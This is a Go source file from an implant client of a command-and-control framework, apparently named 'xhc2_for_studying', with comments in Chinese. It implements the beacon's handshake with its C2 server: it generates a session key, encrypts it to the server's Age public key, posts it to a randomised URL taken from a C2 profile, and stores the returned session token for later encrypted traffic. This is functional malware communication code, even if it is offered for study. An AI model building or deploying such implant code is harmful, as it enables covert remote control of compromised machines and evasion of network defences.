package client

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/protocol"
)

type Client struct {
	baseURL         string
	httpClient      *http.Client
	c2Profile       *protocol.C2Profile
	serverPublicKey string
	cipherCtx       *protocol.CipherContext // 对称加密上下文，握手后设置
	sessionToken    string                  // 服务端分配的 session 令牌
}

func NewClient(cfg *config.BeaconConfig) (*Client, error) {
	if cfg == nil {
		return nil, errors.New("beacon config is nil")
	}
	if cfg.ServerURL == "" {
		return nil, errors.New("server url is empty")
	}

	return &Client{
		baseURL: strings.TrimRight(cfg.ServerURL, "/"),
		httpClient: &http.Client{
			Timeout: 10 * time.Second,
		},
		c2Profile:       &cfg.C2Profile,
		serverPublicKey: cfg.ServerPublicKey,
	}, nil
}

// KeyExchange 执行握手：生成 sKey → Age 加密 → 发给服务端 → 收到 session_token。
func (c *Client) KeyExchange() error {
	// 1. 生成随机对称密钥
	sKey, err := protocol.GenerateSymmetricKey()
	if err != nil {
		return err
	}

	// 2. 创建本地 CipherContext
	cipherCtx, err := protocol.NewCipherContext(sKey)
	if err != nil {
		return err
	}

	// 3. 用服务端 Age 公钥加密 sKey
	encryptedKey, err := protocol.AgeEncryptToServer(sKey, c.serverPublicKey)
	if err != nil {
		return err
	}

	// 4. Base64 编码后发送
	reqBody := []byte(base64.StdEncoding.EncodeToString(encryptedKey))
	reqURL, err := buildRandomURL(c.baseURL, c.c2Profile, protocol.ExtKeyExchange)
	if err != nil {
		return err
	}

	httpReq, err := http.NewRequest(http.MethodPost, reqURL.String(), bytes.NewReader(reqBody))
	if err != nil {
		return err
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return err
	}
	defer func() { _ = resp.Body.Close() }()

	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("key exchange failed with status %d: %s", resp.StatusCode, string(rawBody))
	}

	// 5. Base64 解码 → 解密响应 → 提取 session_token
	decoded, err := base64.StdEncoding.DecodeString(string(rawBody))
	if err != nil {
		return fmt.Errorf("decode key exchange response: %w", err)
	}

	plaintext, err := cipherCtx.Decrypt(decoded)
	if err != nil {
		return fmt.Errorf("decrypt key exchange response: %w", err)
	}
	c.sessionToken = string(plaintext)

	// 6. 保存 CipherContext 供后续通信使用
	c.cipherCtx = cipherCtx
	return nil
}
